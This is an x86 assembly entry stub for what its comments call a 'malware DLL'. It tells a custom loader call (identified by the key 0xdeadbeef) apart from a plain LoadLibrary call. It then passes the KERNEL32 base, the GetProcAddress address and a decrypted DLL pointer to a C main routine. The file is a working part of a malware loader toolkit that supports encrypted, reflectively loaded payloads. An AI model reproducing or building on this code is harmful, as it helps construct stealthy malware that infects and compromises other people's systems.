SECTION .text
GLOBAL _start
EXTERN __main


; *** When _start gets called from the loader:
;     EAX = ptr to _start
;     EBX = 32-bit ident key (Overwritten with OFF_PTRDLL in [esp + 0x4], LOADER ONLY)
;     ECX = address of GetProcAddress
;     EDX = KERNEL32 base address
;     EDI = base address of alloc'd malware DLL
;     ESI = ptr to loader struct
;     [ESP + 0x4] = OFF_PTRDLL
_start:
  xor eax,eax
  ; identificator check (is the caller our loader?)
  cmp ebx,0xdeadbeef
  je _start_loader
  ; started by WinAPI `LoadLibrary(...)`
  pushad
  inc al
  push eax
  xor esi,esi     ; loader struct ptr must be NULL!
  xor ebx,ebx
  jmp short _start_noloader
_start_loader:
  mov ebx,[esp + 0x4]
  push eax
_start_noloader:
  ; new call frame
  push ebp
  mov ebp, esp
  ; call C entry function
  push ebx        ; ptr to (decrypted) DLL (or NULL)
  push esi        ; ptr to loader struct (or NULL)
  push edi        ; ptr of alloc'd dll
  push ecx        ; address of GetProcAddress
  push edx        ; KERNEL32 base address
  call __main
  ; restore old frame
  pop ebp
  pop ecx
  cmp cl,0x1      ; started by WinAPI `LoadLibrary(...) ???
  ; started by WinAPI `LoadLibrary(...)`
  jne _finish_noloader
  popad
  xor eax,eax
  inc eax
  ret 0xc
  _finish_noloader:
  ret

